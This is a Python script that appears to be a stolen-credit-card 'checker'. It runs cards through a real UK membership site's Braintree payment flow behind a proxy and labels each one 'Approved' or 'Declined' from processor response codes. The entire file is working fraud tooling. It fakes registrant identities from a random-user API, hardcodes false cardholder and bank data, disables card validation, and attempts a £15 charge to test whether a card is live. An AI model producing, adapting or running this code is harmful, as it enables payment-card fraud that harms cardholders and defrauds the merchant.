import requests
import base64
import json
from httpx import AsyncClient
import uuid

@staticmethod
def braintree_generate_correlation_id():
    return str(uuid.uuid4())

async def b3avscvv(cc,mes,ano,cvv,proxyg):
    async with AsyncClient(follow_redirects=True, verify=False, proxies=proxyg, timeout=None) as web:
        ip = await web.get('https://api.ipify.org/')
        print(ip.text)
        one = cc[0:1]

        if one == "4":
            cc_type = "VISA"
        elif one == "5":
            cc_type = "MASTERCARD"
        elif one == "3":
            cc_type = "AMERICAN_EXPRESS"
        elif one == "6":
            cc_type = "DISCOVER"

        req = await web.get('https://randomuser.me/api/1.2/?nat=US')
        first_name = req.text.split('"first":"')[1].split('"')[0]
        last_name = req.text.split('"last":"')[1].split('"')[0] 
        gender = req.text.split('"gender":"')[1].split('"')[0]
        first_name = req.text.split('"first":"')[1].split('"')[0]
        last_name = req.text.split('"last":"')[1].split('"')[0]
        email = req.text.split('"email":"')[1].split('"')[0]
        phone = req.text.split('"phone":"')[1].split('"')[0]
        cell = req.text.split('"cell":"')[1].split('"')[0]
        city = req.text.split('"city":"')[1].split('"')[0]
        state = req.text.split('"state":"')[1].split('"')[0]
        postcode = req.text.split('"postcode":')[1].split(',')[0]
        street = req.text.split('"street":"')[1].split('"')[0]
        age = req.text.split('"age":')[1].split(',')[0]


        headers = {
            'accept': '*/*',
            'accept-language': 'es-419,es;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/json',
            'origin': 'https://www.managers.org.uk',
            'priority': 'u=1, i',
            'referer': 'https://www.managers.org.uk/',
            'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        data = json.dumps({
            "oTitle": {
                "strTitle": "Mx"
            },
            "strFirstName": "Sebastian",
            "strLastName": "Gutierrez",
            "oDOB": {
                "strDOB": ""
            },
            "oMobileNumber": {
                "strMobileNumber": ""
            },
            "oEmail": {
                "strEmail": "scarlatmario4@tiktok.tf",
                "strConfirmEmail": "",
                "bLiteVersion": "true"
            },
            "oAddress": {
                "strPostcode": "07050-3824",
                "strAddressLine1": "103-105 Central Ave",
                "strAddressLine2": "",
                "strTown": "Orange",
                "strCountry": "375",
                "strCountryTextValue": "United States of America"
            },
            "oPassword": {
                "strPassword": "null",
                "strConfirmPassword": "null"
            },
            "strKey": "undefined",
            "strPromoCode": "",
            "bTermsAndConditions": "true",
            "oDD": "undefined",
            "strProduct": "member",
            "strPlanId": "Affiliate-OLJN",
            "oBT": "undefined",
            "bOneOffPayment": "",
            "bUpgrade": "false",
            "bFirstMonthTrialPeriodEnabled": "false",
            "strRoute": "website",
            "bLiteVersion": "true",
            "strCallAPIName": "submitFirstForm"
        })

        req1 = await web.post('https://objects.managers.org.uk/objects/CMIWebObjectMicrositeRegisterMember/', headers=headers, json=data)

        data = json.dumps({
            "strTitle": "Mx",
            "strFirstName": first_name,
            "strLastName": last_name,
            "strEmail": email,
            "strMemberCode": "P05184221",
            "strUserToken": "undefined",
            "strCardholderName": f"{first_name} {last_name}",
            "strAddressLine1": street,
            "strAddressLine2": "",
            "strTown": city,
            "strCountry": "United States of America",
            "strPostcode": postcode,
            "strPlanId": "Affiliate-OLJN",
            "strAmount": "15.00",
            "strPromoCode": "",
            "strPromoCodeAmount": "",
            "bMultipleSubscription": "undefined",
            "strCallAPIName": "getClientToken"
        })

        req2 = await web.post(
            'https://objects.managers.org.uk/objects/CMIWebObjectPayment/', 
            headers=headers, 
            content=data 
        )

        clientoken = req2.json()["strClientToken"]
        B64_ = base64.b64decode(clientoken)
        finger = json.loads(B64_)['authorizationFingerprint']


        headers = {
            'accept': '*/*',
            'accept-language': 'es-419,es;q=0.9',
            'authorization': 'Bearer ' + finger,
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://www.managers.org.uk',
            'priority': 'u=1, i',
            'referer': 'https://www.managers.org.uk/',
            'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': braintree_generate_correlation_id(),
            },
            'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
            'operationName': 'ClientConfiguration',
        }

        req3 = await web.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)


        headers = {
            'accept': '*/*',
            'accept-language': 'es-419,es;q=0.9',
            'authorization': 'Bearer ' + finger,
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'priority': 'u=1, i',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'dropin2',
                'sessionId': braintree_generate_correlation_id(),
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                        'cardholderName': f"{first_name} {last_name}",
                        'billingAddress': {
                            'postalCode': postcode,
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        req4 = await web.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        tokencc = req4.json()["data"]["tokenizeCreditCard"]["token"]


        headers = {
            'accept': '*/*',
            'accept-language': 'es-419,es;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'text/plain;charset=UTF-8',
            'origin': 'https://www.managers.org.uk',
            'priority': 'u=1, i',
            'referer': 'https://www.managers.org.uk/',
            'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        data = json.dumps({
            "strTitle": "Mx",
            "strFirstName": first_name,
            "strLastName": last_name,
            "strEmail": email,
            "strMemberCode": "P05184221",
            "strUserToken": "undefined",
            "strCardholderName": f"{first_name} {last_name}",
            "strAddressLine1": street,
            "strAddressLine2": "",
            "strTown": city,
            "strCountry": "United States of America",
            "strPostcode": postcode,
            "strPlanId": "Affiliate-OLJN",
            "strAmount": "15.00",
            "strPromoCode": "",
            "strPromoCodeAmount": "",
            "bMultipleSubscription": "undefined",
            "strCallAPIName": "createCustomer",
            "oPaymentMethod": {
                "nonce": tokencc,
                "details": {
                    "cardholderName": "Mx sadasd sadad",
                    "expirationMonth": "05",
                    "expirationYear": ano,
                    "bin": cc[:6],
                    "cardType": "MASTERCARD",
                    "lastFour": cc[-4:],
                    "lastTwo": cvv[-2:]
                },
                "type": "CreditCard",
                "description": "ending in 19",
                "binData": {
                    "prepaid": "No",
                    "healthcare": "No",
                    "debit": "Yes",
                    "durbinRegulated": "No",
                    "commercial": "Unknown",
                    "payroll": "No",
                    "issuingBank": "BANCO DAVIVIENDA, S.A.",
                    "countryOfIssuance": "COL",
                    "productId": "MDS"
                }
            },
            "strCustomerId": ""
        })

        req5 = await web.post('https://objects.managers.org.uk/objects/CMIWebObjectPayment/', 
                            headers=headers, 
                            content=data)
        
        response_json = req5.json()
        print(response_json)
        try:
            if 'strMessage' in response_json and response_json['strMessage'] == 'Gateway Rejected: risk_threshold':
                status = "Declined ❌"
                processor_code = "Gateway Rejected"
                processor_text = "Risk Threshold"
                cvv_code = "None"
                avs_postal = "None"
                avs_street = "None"
                network_code = "None"
                network_text = "None"
            elif 'strMessage' in response_json and response_json['strMessage'] == 'Gateway Rejected: fraud':
                status = "Declined ❌"
                processor_code = "Gateway Rejected"
                processor_text = "Fraud"
                cvv_code = "None"
                avs_postal = "None"
                avs_street = "None"
                network_code = "None"
                network_text = "None"
            else:
                verification = response_json["oResult"]["verification"]
                processor_code = verification.get("processorResponseCode", "None")
                processor_text = verification.get("processorResponseText", "None")
                cvv_code = verification.get("cvvResponseCode", "None")
                avs_postal = verification.get("avsPostalCodeResponseCode", "None")
                avs_street = verification.get("avsStreetAddressResponseCode", "None")
                network_code = verification.get("networkResponseCode", "None")
                network_text = verification.get("networkResponseText", "None")
        except:
            processor_code = "None"
            processor_text = "None"
            cvv_code = "None"
            avs_postal = "None"
            avs_street = "None"
            network_code = "None"
            network_text = "None"

        if "1000" in processor_code:
            status = "Approved ✅"
        elif "2001" in processor_code:
            status = "Approved ✅"
        elif "2010" in processor_code:
            status = "Approved ✅"
        elif "avs" in processor_text:
            status = "Approved ✅"
        else:
            status = "Declined ❌"

        return status, processor_code, processor_text, cvv_code, avs_postal, avs_street, network_code, network_text
